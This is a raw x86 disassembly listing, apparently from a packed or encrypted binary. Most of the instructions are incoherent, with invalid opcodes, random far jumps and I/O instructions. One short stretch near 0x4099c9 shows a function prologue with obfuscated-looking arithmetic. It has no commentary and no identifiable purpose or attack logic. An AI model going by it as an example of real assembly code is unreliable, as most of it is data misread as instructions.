  4092c8:	test   edx,ebp
  4092ca:	or     eax,0xded3ce80
  4092cf:	xchg   edx,eax
  4092d0:	sub    dh,BYTE PTR [edx]
  4092d2:	ret    0x4be7
  4092d5:	adc    al,0x9e
  4092d7:	or     eax,0x153c8147
  4092dc:	dec    ebx
  4092dd:	sbb    edi,esi
  4092df:	icebp  
  4092e0:	popf   
  4092e1:	jmp    0x2a4c:0xfd0ed0c1
  4092e8:	es adc eax,0x95eb7e3a
  4092ee:	sbb    bl,BYTE PTR [ebp+0x782aeb9b]
  4092f4:	int3   
  4092f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092f6:	cdq    
  4092f7:	cmc    
  4092f8:	and    eax,0x8c2fc342
  4092fd:	test   eax,0xff082f37
  409302:	xor    BYTE PTR [ebp+0x41b26005],cl
  409308:	add    bh,bh
  40930a:	xor    BYTE PTR [ebp+0x41b34405],cl
  409310:	add    bh,bh
  409312:	xor    BYTE PTR [edi-0x7cbcbc2d],al
  409318:	jmp    0x40931d
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	lahf   
  40932e:	das    
  40932f:	pop    edx
  409330:	retf   0xe227
  409333:	jo     0x4093a5
  409335:	and    BYTE PTR [ebp+0x70],bh
  409338:	jo     0x4092fe
  40933a:	pop    eax
  40933b:	inc    esi
  40933c:	xchg   ecx,eax
  40933d:	aad    0x2
  40933f:	pusha  
  409340:	sub    esp,edi
  409342:	lahf   
  409343:	mov    ah,0x82
  409345:	mov    ah,BYTE PTR [edx+0x40]
  409348:	dec    ebx
  409349:	in     al,0xc
  40934b:	mov    ah,0x9c
  40934d:	pop    esi
  40934e:	idiv   BYTE PTR [edx]
  409350:	and    dh,BYTE PTR [edi]
  409352:	xor    al,bl
  409354:	std    
  409355:	idiv   al
  409357:	cmp    al,0xd4
  409359:	cdq    
  40935a:	xchg   ecx,eax
  40935b:	leave  
  40935c:	jecxz  0x409350
  40935e:	test   eax,0xed9211f9
  409363:	lods   al,BYTE PTR ds:[esi]
  409364:	imul   esi,DWORD PTR [ebp+0x6b56e53a],0xffffffd3
  40936b:	push   ss
  40936c:	mov    ss,WORD PTR [eax+edx*4+0x4bb3cb08]
  409373:	xor    BYTE PTR [ecx+edi*2+0x16421071],ah
  40937a:	jmp    0x4092fc
  40937c:	icebp  
  40937d:	sub    al,0x30
  40937f:	cdq    
  409380:	or     BYTE PTR [ebx],ch
  409382:	mov    al,0x54
  409384:	gs jno 0x409404
  409387:	jecxz  0x4093ce
  409389:	and    DWORD PTR [esi+0x2176f3de],0xd2a09d1e
  409393:	ins    DWORD PTR es:[edi],dx
  409394:	retf   0x9263
  409397:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409398:	cmp    edx,DWORD PTR [esi-0x33]
  40939b:	mov    al,ds:0x65aaefb9
  4093a0:	sub    BYTE PTR [ebx-0x56],ch
  4093a3:	bound  esp,QWORD PTR [eax-0x505d492c]
  4093a9:	stos   DWORD PTR es:[edi],eax
  4093aa:	mov    eax,ds:0x30b80ab9
  4093af:	mov    eax,ds:0x60d74a42
  4093b4:	scas   al,BYTE PTR es:[edi]
  4093b5:	lods   al,BYTE PTR ds:[esi]
  4093b6:	in     al,dx
  4093b7:	mov    edx,0x5cbb357d
  4093bc:	icebp  
  4093bd:	mov    ss,WORD PTR [esi]
  4093bf:	lods   al,BYTE PTR ds:[esi]
  4093c0:	mov    BYTE PTR [ebx-0x53a304e9],cl
  4093c6:	stc    
  4093c7:	adc    DWORD PTR [ebx],esi
  4093c9:	jbe    0x409406
  4093cb:	sub    al,BYTE PTR [edi]
  4093cd:	xchg   edi,eax
  4093ce:	out    dx,al
  4093cf:	or     dl,BYTE PTR [ecx-0x7]
  4093d2:	xor    esi,ecx
  4093d4:	pop    ss
  4093d5:	jg     0x40935a
  4093d7:	jae    0x409367
  4093d9:	shl    DWORD PTR [esi],0x1c
  4093dc:	rcl    eax,cl
  4093de:	icebp  
  4093df:	mov    bh,0x9c
  4093e1:	and    ecx,edi
  4093e3:	jecxz  0x4093e9
  4093e5:	pop    esi
  4093e6:	inc    ecx
  4093e7:	xor    bh,BYTE PTR [ecx]
  4093e9:	outs   dx,BYTE PTR ds:[esi]
  4093ea:	pushf  
  4093eb:	sbb    eax,0xebf14c0d
  4093f0:	jp     0x4093a3
  4093f2:	dec    esp
  4093f3:	inc    ebx
  4093f4:	add    DWORD PTR [edi+0x7c9180c8],edi
  4093fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093fb:	xor    ebx,DWORD PTR [eax+0x5a]
  4093fe:	repz sahf 
  409400:	mov    edx,0x667a8540
  409405:	adc    al,0xd0
  409407:	lods   al,BYTE PTR ds:[esi]
  409408:	in     eax,dx
  409409:	mov    eax,0x6a320259
  40940e:	in     eax,dx
  40940f:	xchg   ecx,eax
  409410:	popa   
  409411:	(bad)  
  409412:	xchg   edi,eax
  409413:	jge    0x40941e
  409415:	jbe    0x409496
  409417:	pop    esp
  409418:	mov    bl,0xda
  40941a:	jecxz  0x409405
  40941c:	xor    al,0x4f
  40941e:	xchg   edx,eax
  40941f:	jb     0x4093c3
  409421:	in     eax,dx
  409422:	dec    ecx
  409423:	das    
  409424:	cmc    
  409425:	fs sub eax,0xc5ed6b67
  40942b:	xchg   edi,eax
  40942c:	mov    WORD PTR [esi+eax*2+0x40],es
  409430:	or     esi,ebx
  409432:	das    
  409433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409434:	cmp    eax,0x18e8c152
  409439:	dec    esp
  40943a:	cmc    
  40943b:	popw   ds
  40943d:	dec    DWORD PTR ds:0xa4ccf46c
  409443:	mov    esp,0xc476469a
  409448:	cmp    ebp,edx
  40944a:	adc    BYTE PTR [ebp+0x53777445],bh
  409450:	fadd   QWORD PTR fs:[edi-0x75]
  409454:	push   ds
  409455:	repnz fnstcw WORD PTR [ecx]
  409458:	push   ds
  409459:	push   eax
  40945a:	(bad)  
  40945b:	adc    eax,0x5562cf49
  409460:	jg     0x4094a1
  409462:	xor    al,0x25
  409464:	pop    esp
  409465:	outs   dx,BYTE PTR ds:[esi]
  409466:	stc    
  409467:	sub    DWORD PTR [ebx+0xf],ecx
  40946a:	imul   esp,DWORD PTR [edx],0x69e636e7
  409470:	scas   eax,DWORD PTR es:[edi]
  409471:	pop    eax
  409472:	mov    edi,0x7a2180f5
  409477:	push   0xffffffe3
  409479:	pushf  
  40947a:	fldcw  WORD PTR [edi+0x44390dc2]
  409481:	jo     0x409451
  409483:	mov    ebx,DWORD PTR [ebp+0x210d62b9]
  409489:	dec    eax
  40948a:	and    BYTE PTR [esi-0x13],dl
  40948d:	jl     0xf9a58717
  409493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409494:	out    0xde,al
  409496:	dec    esp
  409497:	cmp    al,BYTE PTR [ebp-0x6f759972]
  40949d:	mov    eax,ecx
  40949f:	fwait
  4094a0:	data16 stc 
  4094a2:	ss (bad) 
  4094a4:	lds    edx,FWORD PTR [ecx]
  4094a6:	pop    sp
  4094a8:	fstp   DWORD PTR [edx-0x540a56ff]
  4094ae:	jnp    0x40951c
  4094b0:	call   0xa705d91f
  4094b5:	inc    esi
  4094b6:	aas    
  4094b7:	pop    esi
  4094b8:	loop   0x4094ea
  4094ba:	jmp    0x2e6c:0x3b20876
  4094c1:	dec    esi
  4094c2:	lods   eax,DWORD PTR es:[esi]
  4094c4:	rol    BYTE PTR [edx+ebp*1-0x34],1
  4094c8:	mov    al,ds:0x8ed7e2a2
  4094cd:	inc    ebx
  4094ce:	rol    dl,0x1a
  4094d1:	ins    BYTE PTR es:[edi],dx
  4094d2:	enter  0xbd80,0x67
  4094d6:	call   0x88d4:0x7b398ebe
  4094dd:	(bad)  [esi]
  4094df:	xchg   esi,eax
  4094e0:	pushf  
  4094e1:	test   eax,0x48873271
  4094e6:	(bad)
  4094e9:	test   eax,0xa8978ea8
  4094ee:	xchg   edx,eax
  4094ef:	rcr    ah,cl
  4094f1:	sub    al,0xf5
  4094f3:	sub    eax,0x67ce1f9
  4094f8:	mov    al,BYTE PTR [edi]
  4094fa:	adc    DWORD PTR [edx-0x3b91da23],esp
  409500:	fild   DWORD PTR [eax]
  409502:	or     al,0x9a
  409504:	jmp    0xafc5:0x9e64d13f
  40950b:	push   0xd136cba
  409510:	cvttps2pi mm7,QWORD PTR [edi]
  409513:	(bad)  
  409514:	jmp    0xb48:0xe41fb46c
  40951b:	stos   DWORD PTR es:[edi],eax
  40951c:	outs   dx,DWORD PTR ds:[esi]
  40951d:	arpl   cx,ax
  40951f:	mov    ebx,0x995c21a7
  409524:	or     BYTE PTR [ebx-0xc],ch
  409527:	jbe    0x40950e
  409529:	test   eax,0xc48e6b2f
  40952e:	frstor [ebp-0x5d06f094]
  409534:	ins    BYTE PTR es:[edi],dx
  409535:	outs   dx,BYTE PTR ds:[esi]
  409536:	push   ds
  409537:	shl    BYTE PTR [esp+edi*2],0x54
  40953b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40953c:	inc    edi
  40953d:	push   eax
  40953e:	cdq    
  40953f:	add    al,0x2f
  409541:	sbb    esp,DWORD PTR [eax+0x23]
  409544:	sbb    BYTE PTR [esp+esi*1-0x1f],dh
  409548:	outs   dx,DWORD PTR ds:[esi]
  409549:	enter  0xc8f3,0xa0
  40954d:	fimul  DWORD PTR [eax+0x57251b3a]
  409553:	add    al,0xdf
  409555:	imul   DWORD PTR [edx+0x7467d258]
  40955b:	cdq    
  40955c:	retf   0xec1e
  40955f:	adc    dl,BYTE PTR [ecx]
  409561:	fistp  QWORD PTR [esi+0x1f75bd6a]
  409567:	lahf   
  409568:	and    al,0xd0
  40956a:	int    0x25
  40956c:	push   0x1eca3918
  409571:	jg     0x409563
  409573:	or     al,0xf5
  409575:	clc    
  409576:	(bad)  [edi+ebx*1-0x30c7ef73]
  40957d:	push   ds
  40957e:	(bad)  ds:0xb32050e3
  409584:	inc    ecx
  409585:	bnd je 0x40951e
  409588:	add    al,BYTE PTR [ebx-0x2b]
  40958b:	mov    edx,DWORD PTR [ecx+0x7]
  40958e:	sub    al,0x53
  409590:	xchg   ebp,eax
  409591:	imul   esi,ebx,0xe8f8c46f
  409597:	into   
  409598:	lock stos BYTE PTR es:[edi],al
  40959a:	push   edi
  40959b:	fwait
  40959c:	add    al,0xb1
  40959e:	frstor [ebx]
  4095a0:	mov    bh,0xb3
  4095a2:	xchg   esp,eax
  4095a3:	fild   WORD PTR [edi-0x62351ffb]
  4095a9:	sbb    al,0xb9
  4095ab:	ds cmp al,0xcf
  4095ae:	test   DWORD PTR [ebx+eiz*2],eax
  4095b1:	inc    ebx
  4095b2:	enter  0xef2d,0x0
  4095b6:	pop    esp
  4095b7:	push   ebp
  4095b8:	outs   dx,BYTE PTR ds:[esi]
  4095b9:	mov    edi,DWORD PTR [esi]
  4095bb:	pop    ebp
  4095bc:	push   es
  4095bd:	lods   al,BYTE PTR ds:[esi]
  4095be:	icebp  
  4095bf:	popf   
  4095c0:	sub    al,0xb
  4095c2:	sbb    edi,DWORD PTR [edx+0x41]
  4095c5:	hlt    
  4095c6:	xchg   esp,eax
  4095c7:	sbb    al,0x60
  4095c9:	fidiv  DWORD PTR [edx-0x6bfbd464]
  4095cf:	ja     0x40957e
  4095d1:	mov    cl,0x55
  4095d3:	inc    edx
  4095d4:	jnp    0x40961c
  4095d6:	data16 mov BYTE PTR [edx-0xa],cl
  4095da:	push   0x3fc945ce
  4095df:	int3   
  4095e0:	into   
  4095e1:	ins    BYTE PTR es:[edi],dx
  4095e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095e3:	jmp    0x362c4098
  4095e8:	cdq    
  4095e9:	and    bl,BYTE PTR [ecx+0x1f58220e]
  4095ef:	sub    edx,esi
  4095f1:	adc    ecx,ebx
  4095f3:	jns    0x409638
  4095f5:	jecxz  0x409671
  4095f7:	std    
  4095f8:	pop    es
  4095f9:	cmp    al,0x7
  4095fb:	sub    eax,0x57b29f6c
  409600:	push   esp
  409601:	add    DWORD PTR [ebx-0x6e57ae28],edi
  409607:	shr    BYTE PTR [edi-0x3b],cl
  40960a:	lds    esp,FWORD PTR [edi+0x0]
  40960d:	xor    BYTE PTR [edx+0x5c],dl
  409610:	sub    BYTE PTR [esi-0x72],0xc7
  409614:	mov    ebx,0xdb4f6c01
  409619:	pop    ecx
  40961a:	pop    esi
  40961b:	fcomp  QWORD PTR [edx+0x60f9ecd]
  409621:	lea    esi,[esp+ebx*4-0x30]
  409625:	xor    eax,0xb2cc7cda
  40962a:	scas   al,BYTE PTR es:[edi]
  40962b:	fdivr  QWORD PTR [ebp+0x41265bb9]
  409631:	jmp    0x2cb392d0
  409636:	ficomp DWORD PTR [ebx+0x7aaa224c]
  40963c:	ss mov al,0x44
  40963f:	jns    0x4095c1
  409641:	add    BYTE PTR [ecx+0x3117d53e],dl
  409647:	(bad)  
  409648:	xchg   esi,eax
  409649:	mov    al,ds:0xb1727fa5
  40964e:	xor    BYTE PTR [ebx],ah
  409650:	xchg   DWORD PTR cs:[ebp+0x13e8805c],ebp
  409657:	mov    edi,0x6fd5f6d1
  40965c:	pop    esi
  40965d:	jmp    0x39df:0x45f41cda
  409664:	(bad)  
  409665:	sub    edi,edx
  409667:	and    dh,BYTE PTR [ebp-0x1]
  40966a:	push   eax
  40966b:	add    DWORD PTR [ebx+0xd8be045],ecx
  409671:	and    al,0xb2
  409673:	inc    ecx
  409674:	add    cl,ch
  409676:	dec    eax
  409677:	add    eax,DWORD PTR [eax]
  409679:	add    bh,ch
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   DWORD PTR [ecx+0x72],ebp
  409688:	out    0x50,al
  40968a:	xlat   BYTE PTR ds:[ebx]
  40968b:	out    dx,eax
  40968c:	jo     0x4096fe
  40968e:	and    BYTE PTR [ebp+0x70],bh
  409691:	jo     0x40961d
  409693:	enter  0x6049,0x5f
  409697:	add    BYTE PTR [edi],bl
  409699:	xor    DWORD PTR [eax+0x6acc261f],esi
  40969f:	push   0x42df21e5
  4096a4:	mov    ebx,DWORD PTR [edi]
  4096a6:	dec    edi
  4096a7:	or     al,0xf9
  4096a9:	and    BYTE PTR [ecx-0x6d95df33],0x19
  4096b0:	xchg   ebx,eax
  4096b1:	fldenv [esi-0x6d3c449e]
  4096b7:	ja     0x40963e
  4096b9:	and    dh,BYTE PTR [ecx+eiz*4]
  4096bc:	pop    DWORD PTR [edi+eax*2+0x663075c3]
  4096c3:	shl    BYTE PTR [esi],cl
  4096c5:	out    0x63,eax
  4096c7:	mov    BYTE PTR [eax+0x20],bl
  4096ca:	adc    bl,BYTE PTR [ecx]
  4096cc:	fist   WORD PTR [esi-0x7d3d7beb]
  4096d2:	jg     0x4096c5
  4096d4:	xchg   ebp,eax
  4096d5:	sbb    dh,ch
  4096d7:	into   
  4096d8:	mov    ds:0x240edc3e,eax
  4096dd:	repnz mov dl,0xe
  4096e0:	mov    ds:0xf3610141,al
  4096e5:	outs   dx,DWORD PTR ds:[esi]
  4096e6:	sar    BYTE PTR ds:0x4473bb1c,1
  4096ec:	add    al,0xb6
  4096ee:	ficom  WORD PTR [ebp+0x43]
  4096f2:	call   0x6f623857
  4096f7:	and    BYTE PTR [ebx],ch
  4096f9:	adc    bl,bl
  4096fb:	ds adc eax,edi
  4096fe:	iret   
  4096ff:	dec    eax
  409700:	(bad)  
  409701:	mov    esi,0xd3926ac8
  409706:	sub    cl,bh
  409708:	pop    ds
  409709:	xchg   cl,ah
  40970b:	mov    dl,0xf2
  40970d:	fbld   TBYTE PTR [edi]
  40970f:	fstp   QWORD PTR [esi+0x19]
  409712:	(bad)  
  409713:	mov    cl,0xc5
  409715:	mov    al,0x36
  409717:	pop    edi
  409718:	add    BYTE PTR [edi-0x29],0xfb
  40971c:	xchg   ebp,eax
  40971d:	cld    
  40971e:	jmp    0x26751605
  409723:	cmp    ebp,esi
  409725:	leave  
  409726:	shr    BYTE PTR [ecx-0x7d],0x3
  40972a:	(bad)  
  40972b:	lods   eax,DWORD PTR ds:[esi]
  40972c:	in     eax,0x71
  40972e:	pop    eax
  40972f:	cmp    BYTE PTR [ebx-0x68fbc45e],dl
  409735:	cli    
  409736:	pop    DWORD PTR [edi+0x58]
  409739:	(bad)  
  40973a:	pop    ss
  40973b:	getsec 
  40973d:	cli    
  40973e:	adc    al,0xcd
  409740:	xor    BYTE PTR [ecx-0x6a2a8791],dl
  409746:	nop
  409747:	inc    esi
  409748:	hlt    
  409749:	daa    
  40974a:	popf   
  40974b:	jns    0x40972f
  40974d:	int3   
  40974e:	pop    ebx
  40974f:	sub    DWORD PTR [ebx-0x2da4d5a8],eax
  409755:	addr16 add eax,0x9343f9a
  40975b:	jno    0x4097c3
  40975d:	pop    edi
  40975e:	ret    0xb0a5
  409761:	mov    ds:0x6709e69,eax
  409766:	ds mov ecx,0xfe633cb3
  40976c:	mov    esi,0x5fb02433
  409771:	jne    0x40978c
  409773:	push   esi
  409774:	sahf   
  409775:	imul   eax,DWORD PTR [eax],0x2d757ddf
  40977b:	pop    esi
  40977c:	push   cs
  40977d:	mov    ecx,0x8811c2f5
  409782:	cli    
  409783:	test   al,0x34
  409785:	jns    0x4097da
  409787:	std    
  409788:	push   eax
  409789:	xchg   esi,eax
  40978a:	jg     0x409767
  40978c:	xchg   edx,eax
  40978d:	cmp    eax,0x6c01fd28
  409792:	or     BYTE PTR [esi+0xa99d353],dh
  409798:	push   esp
  409799:	mov    ds:0xf1b8399f,eax
  40979e:	xchg   DWORD PTR [esi+ebx*8-0x5cb39e6],esp
  4097a5:	mov    esi,0xdbb12763
  4097aa:	fstp   st(0)
  4097ac:	bound  eax,QWORD PTR [edi]
  4097ae:	call   0xf1713db6
  4097b3:	mov    dl,0x2
  4097b5:	cmp    al,0x5c
  4097b7:	add    eax,0xd57e479e
  4097bc:	and    BYTE PTR [ebp+0x3b],bh
  4097bf:	ja     0x409791
  4097c1:	les    esp,FWORD PTR [ebx+edx*1-0x69]
  4097c5:	and    ecx,DWORD PTR [ecx+0x3473a05e]
  4097cb:	inc    ebp
  4097cc:	shr    al,cl
  4097ce:	xchg   edx,eax
  4097cf:	lock or DWORD PTR [ebx],edx
  4097d2:	scas   al,BYTE PTR es:[edi]
  4097d3:	push   0x5
  4097d5:	xor    al,0x0
  4097d7:	test   al,0xc4
  4097d9:	adc    ah,BYTE PTR [ecx]
  4097db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097dc:	loopne 0x409833
  4097de:	aas    
  4097df:	mov    dl,0x9d
  4097e1:	push   edx
  4097e2:	test   DWORD PTR [ecx-0x527ee92c],edx
  4097e8:	push   ds
  4097e9:	fistp  QWORD PTR [edi+ecx*2-0x74]
  4097ed:	mov    dh,0x5b
  4097ef:	loop   0x40982c
  4097f1:	dec    edi
  4097f2:	(bad)  
  4097f3:	cmp    DWORD PTR [ecx+0x10],edi
  4097f6:	mov    ch,0xc
  4097f8:	cld    
  4097f9:	lock jp 0x4097c9
  4097fc:	cmp    eax,DWORD PTR [ecx]
  4097fe:	cwde   
  4097ff:	pop    ds
  409800:	inc    edi
  409801:	or     ebp,eax
  409803:	jo     0x4097f9
  409805:	out    0x83,eax
  409807:	and    DWORD PTR [edx-0x39],edx
  40980a:	xor    eax,0xe3e654eb
  40980f:	jge    0x40988e
  409811:	ins    BYTE PTR es:[edi],dx
  409812:	jae    0x40983b
  409814:	or     BYTE PTR [ebx],bl
  409816:	adc    eax,0xb2d9a2c8
  40981b:	fldenv [ebx-0x15]
  40981e:	stos   BYTE PTR es:[edi],al
  40981f:	add    DWORD PTR [ebx+0x39],0x53
  409823:	jge    0x4097cf
  409825:	fs (bad) 
  409827:	jb     0x409801
  409829:	mov    dh,0x16
  40982b:	mov    ah,BYTE PTR [ebx]
  40982d:	xchg   ebx,eax
  40982e:	daa    
  40982f:	cmp    bl,BYTE PTR [ecx+edx*1]
  409832:	mov    DWORD PTR [ebx-0x2a84da6],ebp
  409838:	mov    edx,0x626282a5
  40983d:	sub    DWORD PTR [edx],eax
  40983f:	xlat   BYTE PTR ds:[ebx]
  409840:	or     edi,DWORD PTR [esi-0x56e83c8b]
  409846:	mov    al,ds:0x90aaa38b
  40984b:	mov    eax,ds:0x3f93753b
  409850:	push   ebx
  409851:	cmp    eax,0x51bad601
  409856:	nop
  409857:	xchg   ebp,eax
  409858:	ins    DWORD PTR es:[edi],dx
  409859:	jl     0x40983e
  40985b:	and    ecx,DWORD PTR [ebp+0x77e7a195]
  409861:	into   
  409862:	sub    bh,BYTE PTR [esi]
  409864:	cmp    BYTE PTR [eax-0x307fbc4e],al
  40986a:	ins    DWORD PTR es:[edi],dx
  40986b:	or     DWORD PTR [edx+0x25e04288],ebp
  409871:	pop    edx
  409872:	jle    0x4098bf
  409874:	dec    eax
  409875:	cld    
  409876:	xor    BYTE PTR [eax+0x4b],cl
  409879:	retf   
  40987a:	hlt    
  40987b:	xlat   BYTE PTR ds:[ebx]
  40987c:	xor    eax,DWORD PTR [esi+0x36]
  40987f:	ror    BYTE PTR [edi+0x28889e78],cl
  409885:	js     0x4098c9
  409887:	js     0x409819
  409889:	xor    eax,DWORD PTR [edx]
  40988b:	retf   0x1866
  40988e:	retf   0x3854
  409891:	mov    al,ds:0x1a73514
  409896:	hlt    
  409897:	dec    esp
  409898:	leave  
  409899:	std    
  40989a:	inc    ebp
  40989b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40989c:	sar    DWORD PTR [ecx+ebx*8],1
  40989f:	pop    DWORD PTR [ecx]
  4098a1:	das    
  4098a2:	cwde   
  4098a3:	add    al,ch
  4098a5:	cs mov ebp,0x4c5e1943
  4098ab:	sbb    al,0xeb
  4098ad:	cmp    BYTE PTR [esi-0x70],cl
  4098b0:	push   ebp
  4098b1:	mov    ss,WORD PTR [edi+0x7f]
  4098b4:	loope  0x409866
  4098b6:	dec    ecx
  4098b7:	(bad)
  4098ba:	sbb    bl,BYTE PTR [ebx]
  4098bc:	and    al,0x18
  4098be:	sub    al,0xda
  4098c0:	lock mov al,ds:0x7895dd2e
  4098c6:	jb     0x4098b9
  4098c8:	popf   
  4098c9:	sub    ecx,ebp
  4098cb:	outs   dx,DWORD PTR ds:[esi]
  4098cc:	and    al,0xea
  4098ce:	sub    BYTE PTR [esp+eax*2+0x77],dl
  4098d2:	stos   BYTE PTR es:[edi],al
  4098d3:	ror    DWORD PTR [esi+0x19],1
  4098d6:	ss pop edi
  4098d8:	stos   BYTE PTR es:[edi],al
  4098d9:	popa   
  4098da:	sbb    al,0x68
  4098dc:	pop    es
  4098dd:	add    dl,cl
  4098df:	add    esi,0xf8248241
  4098e5:	aad    0x52
  4098e7:	out    0x3d,eax
  4098e9:	sbb    BYTE PTR [esi],al
  4098eb:	adc    bl,cl
  4098ed:	jle    0x4098c8
  4098ef:	mov    ecx,0xb78801f6
  4098f4:	cmp    BYTE PTR [ecx],ah
  4098f6:	pop    es
  4098f7:	sbb    eax,esi
  4098f9:	std    
  4098fa:	ins    BYTE PTR es:[edi],dx
  4098fb:	in     al,0x33
  4098fd:	xlat   BYTE PTR fs:[ebx]
  4098ff:	xchg   edx,eax
  409900:	pop    edi
  409901:	hlt    
  409902:	nop
  409903:	jnp    0x409888
  409905:	stos   DWORD PTR es:[edi],eax
  409906:	and    eax,0x3bd9c636
  40990b:	fnstsw WORD PTR [esp+ecx*1+0x69fb3bd8]
  409912:	dec    esp
  409913:	fucomi st,st(4)
  409915:	xchg   ecx,eax
  409916:	add    al,bl
  409918:	and    bh,bl
  40991a:	cmp    BYTE PTR [ebp-0x75],0x1f
  40991e:	retf   0x81c1
  409921:	out    0x35,al
  409923:	add    BYTE PTR [esi+0x7d],bh
  409926:	cmp    al,0x6f
  409928:	outs   dx,DWORD PTR ds:[esi]
  409929:	mov    ch,dh
  40992b:	cmp    eax,0xa02645e2
  409930:	ja     0x409950
  409932:	sub    DWORD PTR [esi],esi
  409934:	sbb    eax,0xf4da88e6
  409939:	and    eax,0xf07c973a
  40993e:	aaa    
  40993f:	cdq    
  409940:	push   0x9a2fdcee
  409945:	dec    esp
  409946:	pop    eax
  409947:	sahf   
  409948:	xchg   esi,eax
  409949:	cmp    eax,0x6fd8d790
  40994e:	push   esi
  40994f:	adc    esi,DWORD PTR [ebx+0x72]
  409952:	aaa    
  409953:	shl    BYTE PTR [ecx+0x305fa6eb],cl
  409959:	shl    BYTE PTR [ebx+0x5a],0x51
  40995d:	mov    esi,0xbb29686a
  409962:	inc    ebx
  409963:	ss lock nop
  409966:	jg     0x409937
  409968:	lea    ebp,[edx-0x3970e1be]
  40996e:	push   0xec7be9ac
  409973:	mov    ebp,0x2ea04da3
  409978:	sahf   
  409979:	mov    eax,0x49ffd0d0
  40997e:	cmp    DWORD PTR ds:0xb8bd0c92,0xb5f51c83
  409988:	push   cs
  409989:	mov    ebp,0xe9704053
  40998e:	jmp    0x80093c97
  409993:	mov    eax,0x9999cf71
  409998:	inc    ecx
  409999:	icebp  
  40999a:	repz cmp DWORD PTR [edi],esi
  40999d:	xchg   esp,eax
  40999e:	call   0xde3b:0x50a16819
  4099a5:	aam    0x3
  4099a7:	xchg   esp,eax
  4099a8:	dec    ecx
  4099a9:	inc    ebp
  4099aa:	lock je 0x409953
  4099ad:	in     eax,0x5e
  4099af:	inc    eax
  4099b0:	sbb    ebp,DWORD PTR [edx+0x6b]
  4099b3:	or     eax,0x282ce4aa
  4099b8:	mov    cl,0xa6
  4099ba:	mov    dl,0x2f
  4099bc:	cld    
  4099bd:	pop    ss
  4099be:	ret    0xb318
  4099c1:	jp     0x4099c4
  4099c3:	or     BYTE PTR [edi+0x5e],bl
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	idiv   DWORD PTR [esi]
  409a5a:	push   edx
  409a5b:	or     ah,BYTE PTR [eax]
  409a5d:	xchg   esp,ebp
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a76
  409a66:	push   0xe9307038
  409a6b:	xchg   BYTE PTR [eax],bh
  409a6d:	out    dx,al
  409a6e:	xor    BYTE PTR [esi],cl
  409a70:	jns    0x409a0c
  409a72:	jle    0x409a54
  409a74:	int    0x15
  409a76:	inc    edi
  409a77:	mov    ds,WORD PTR cs:[eax]
  409a7a:	pop    ebp
  409a7b:	mov    sp,0xc693
  409a7f:	or     eax,0x297df93f
  409a84:	jp     0x409a63
  409a86:	in     al,dx
  409a87:	jno    0x409b05
  409a89:	jg     0x409a16
  409a8b:	jge    0x409aab
  409a8d:	sti    
  409a8e:	hlt    
  409a8f:	push   ecx
  409a90:	adc    ecx,DWORD PTR [ebx]
  409a92:	push   0x15
  409a94:	mov    esp,0x7c68a896
  409a99:	out    0xc6,eax
  409a9b:	and    al,0xf3
  409a9d:	sub    bl,BYTE PTR [edx]
  409a9f:	jge    0x409a4e
  409aa1:	aam    0x15
  409aa3:	(bad)  [ecx-0x61]
  409aa6:	mov    ebp,0xd7dcc9a0
  409aab:	adc    al,0x21
  409aad:	adc    ebx,DWORD PTR [eax-0x157252c9]
  409ab3:	daa    
  409ab4:	sbb    BYTE PTR [edi-0x22c4c28f],ah
  409aba:	jecxz  0x409aee
  409abc:	jo     0x409b04
  409abe:	or     ch,BYTE PTR [ebx+0x42a68869]
  409ac4:	xchg   DWORD PTR [ecx],eax
  409ac6:	sub    BYTE PTR [eax+0x6d],0xa6
  409aca:	adc    al,0xeb
  409acc:	imul   ecx,ebp,0xffffff80
  409acf:	cmp    ch,BYTE PTR [esp+edi*4-0x7274ff18]
  409ad6:	dec    esp
  409ad7:	pop    ebp
  409ad8:	or     bl,ch
